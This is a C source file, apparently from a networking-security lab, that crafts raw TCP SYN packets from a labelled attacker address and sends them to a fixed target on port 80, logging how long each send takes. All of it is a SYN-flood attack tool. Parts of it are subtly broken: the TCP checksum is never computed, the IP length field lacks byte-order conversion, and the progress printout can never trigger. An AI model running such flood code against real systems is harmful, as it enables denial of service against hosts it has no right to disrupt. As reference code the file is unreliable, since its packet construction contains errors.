#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/time.h>
#include <errno.h>

// Constants
#define INNER_LOOPS 50
#define OUTER_LOOPS 10
#define TARGET_IP "10.9.0.4"
#define TARGET_PORT 80

// Function to calculate checksum
unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    unsigned short *w = buf;
    int nleft = len;
    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1) {
        sum += *(unsigned char *)w;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)~sum;
}

// Function to send a single SYN packet and log the time it took
void send_syn_packet(int sockfd, struct sockaddr_in *target_addr, int index, FILE *log_file) {
    char packet[1024];
    memset(packet, 'X', 1024);

    // IP header
    struct iphdr *iph = (struct iphdr *) packet;
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = inet_addr("10.9.0.2"); // Attacker's IP
    iph->daddr = target_addr->sin_addr.s_addr;

    // TCP header
    struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof(struct iphdr));
    tcph->source = htons(rand() % 65535);
    tcph->dest = htons(TARGET_PORT);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    // Calculate IP checksum
    iph->check = checksum((unsigned short *) packet, iph->tot_len);

    
    // Send the packet and log the time it took
    struct timeval start_time, finish_time;
    gettimeofday(&start_time, NULL);

    if (sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr *) target_addr, sizeof(*target_addr)) < 0) {
        perror("Send failed");
    }

    gettimeofday(&finish_time, NULL);

    // Calculate time difference in milliseconds
    float time_diff = ((float)finish_time.tv_sec - (float)start_time.tv_sec) * 1000.0 + ((float)finish_time.tv_usec - (float)start_time.tv_usec) / 1000.0;

    // Log the time difference
    fprintf(log_file, "%d %lf\n", index, time_diff);
}

int main() {
    int sockfd;
    struct sockaddr_in target_addr;
    FILE *log_file = fopen("syns_result_c.txt", "w");

    if (log_file == NULL) {
        perror("Failed to open log file");
        return 1;
    }

    // Initialize target address
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr);

    // Create raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return 1;
    }

    // Send SYN packets
    for (int i = 0; i < OUTER_LOOPS; i++) {
        for (int j = 0; j < INNER_LOOPS; j++) {
            send_syn_packet(sockfd, &target_addr, i * INNER_LOOPS + j, log_file);
             if ((j + 1) % 1000 == 0) {
                printf("Sent %d packets in iteration %d\n", j + 1, i + 1);
            }
        }
       
    }

    fclose(log_file);
    close(sockfd);
    return 0;
}
